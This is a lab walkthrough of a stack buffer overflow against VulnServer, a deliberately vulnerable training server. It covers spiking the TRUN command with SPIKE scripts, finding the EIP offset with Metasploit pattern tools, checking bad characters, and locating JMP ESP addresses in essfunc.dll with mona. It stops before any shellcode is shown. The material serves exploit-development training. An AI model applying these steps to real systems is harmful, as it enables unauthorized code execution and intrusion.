# VulnServer - Buffer Overflow Walkthrough

## Steps

1. Spiking - finding vulnerable part/command of the program
2. Fuzzing - fuzzing with multiple characters to see if you can break it
3. Finding the Offset - see at what point it breaks
4. Overwriting the EIP - use the offset to overwrite the EIP (return address)
5. Finding Bad Characters
6. Finding the Right Module
7. Generating Shellcode
8. Root

### Spiking

- Connect to VulnServer with netcat `nc`.
- `nc 192.168.10.7 9999 -v` and run `HELP` command. It will list all the commands available to run.
- ```
    Valid Commands:
    HELP
    STATS [stat_value]
    RTIME [rtime_value]
    LTIME [ltime_value]
    SRUN [srun_value]
    TRUN [trun_value]
    GMON [gmon_value]
    GDOG [gdog_value]
    KSTET [kstet_value]
    GTER [gter_value]
    HTER [hter_value]
    LTER [lter_value]
    KSTAN [lstan_value]
    EXIT
  ```
- Run `stats.spk` to fuzz and see if `STATS` command is vulnerable.
- - `s_readline();` will read the banner we get on connecting to VulnServer with netcat.

  ```
  s_readline();
  s_string("STATS ");
  s_string_variable("0");
  ```

- `generic_send_tcp 192.168.10.7 9999 stats.spk 0 0`
- Nothing happens even if we let it run for a few mins. `STATS` command is probably not vulnerable.
- Run `trun.spk` spike script to see if `TRUN` command is vulnerable.

  ```
  s_readline();
  s_string("TRUN ");
  s_string_variable("0");
  ```

- `generic_send_tcp 192.168.10.7 9999 trun.spk 0 0`
- VulnServer crashes inside the Immunity Debugger. `TRUN` command looks vulnerable.

### Fuzzing

- Write `fuzz.py` python script to fuzz.
- `chmod +x fuzz.py` to make it executable.
- Run `fuzz.py` to fuzz `TRUN` with payload: `TRUN /.:/`.
- See at how many bytes the VulnServer crashes inside Immunity Debugger.
- Stop the fuzz script and note the number of bytes.

### Finding the Offset

- After stopping the fuzz script, it shows VulnServer crashed at around 2500 bytes.
- Use `pattern_create.rb` to create a pattern that we can send to VulnServer as a payload.
- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500`
- Copy that pattern text and paste it inside the `offset.py` script as `offset` variable which will be a long string of these 2500 characters pattern.
- `chmod +x offset.py` to make it executable.
- Run the `offset.py` script. VulnServer will crash inside the Immunity Debugger.
- Note the value of EIP as we will need it to find the offset. EIP => `386F4337`.
- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500 -q 386F4337`
- Running this will give us the pattern offset => `Exact match at offset 2003`.
- So the offset is at 2003 bytes and the EIP itself is 4 bytes long. And we need to overwrite these 4 bytes on EIP.

### Overwriting the EIP

- Note: hex value of A = 41; B = 42.
- We need to figure out at what point we start overwriting the EIP.
- Check `shellcode.py`. We know that the offset is 2003 bytes. So we will send 2003 'A's (`"A" * 2003`) which will fill up the buffer space. And we know that EIP is 4 bytes. So we will send 4 'B's (`"B" * 4`) after 2003 'A's.
- `chmod +x shellcode.py` to make it executable.
- Run `shellcode.py` script and check the EIP value.
- We see 41414141 ('A's) in EBP which comes before EIP in the stack.
- And we have 42424242 ('B's) in EIP which means we are overwriting EIP at that point. We sent only 4 bytes of 'B's and they are all on EIP. Which means we control the EIP now.

### Finding Bad Characters

- Copy badchars variable from [here: ins1gn1a](https://www.ins1gn1a.com/identifying-bad-characters/) and paste it in the `badchars.py` file.
- Note: `x00` (null byte) is a known bad character so has been removed from the list.
- `chmod +x badchars.py` to make it executable.
- Run `badchars.py` script and VulnServer will crash inside the Immunity Debugger.
- Inside Immunity Debugger, in Registers pane, right click on ESP value and select **Follow in Dump** option.
- Now in Hex Dump pane, start looking for anything that is out of order.

### Finding the Right Module

- In this step, we will be looking for DLLs or anything without any memory protections like Rebase, SafeSEH, ASLR, etc.
- Copy the `mona.py` file to `PyCommands` directory in `C:\Program Files (x86)\Immunity Inc\Immunity Debugger`.
- Reopen Immunity Debugger, open VulnServer inside and run. Then in the command section at the bottom, type `!mona modules` and hit enter.
- We are looking for something that is attached to VulnServer itself and has `False` on all the memory protections. So this one seems to be it:
  ```
  Log data, item 15
  Address=0BADF00D
  Message= 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (E:\BOF\vulnserver\essfunc.dll)
  ```
- We need op code equivalent of JMP (jump code in assembly). Basically we are trying to convert assembly language into hex code.
- `locate nasm_shell`
- `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
- `JMP ESP` and press enter to get hex code for `JMP ESP` => `00000000 FFE4`
- The hex code equivalent of assembly `JMP ESP` is `FFE4`.
- Now in the Immunity Debugger command bar:
  `!mona find -s "\xff\xe4" -m essfunc.dll` and press enter.

  ```
  Command used:
  !mona find -s "\xff\xe4" -m essfunc.dll

  Results :
  0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x625011c7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x625011d3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x625011df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x625011eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x625011f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  0x62501205 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\BOF\vulnserver\essfunc.dll)
  Found a total of 9 pointers
  ```

-
